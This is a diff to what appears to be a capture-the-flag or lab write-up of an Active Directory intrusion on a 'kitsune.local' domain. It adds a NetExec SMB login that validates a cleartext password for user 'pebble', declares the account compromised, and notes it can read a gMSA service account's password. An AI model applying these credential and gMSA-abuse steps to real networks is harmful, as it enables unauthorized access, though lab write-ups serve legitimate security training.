@@ -416,7 +416,17 @@ evil-winrm-py PS C:\Users\schlop>
 Ill then just decrypt the cred
 
 ```python
-
+❯❯❯ nxc smb dc01.kitsune.local -u 'pebble' -p 'PebbleIs47!' --smb-timeout 4
+SMB         10.1.176.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.176.128    445    DC01             [+] kitsune.local\pebble:PebbleIs47!
 ```
+
+This user is now compromised!
+
+![](Pasted%20image%2020261023184638.png)
+
+This user can read the gMSA password of the `svc_gmsa$`
+
+
 
 
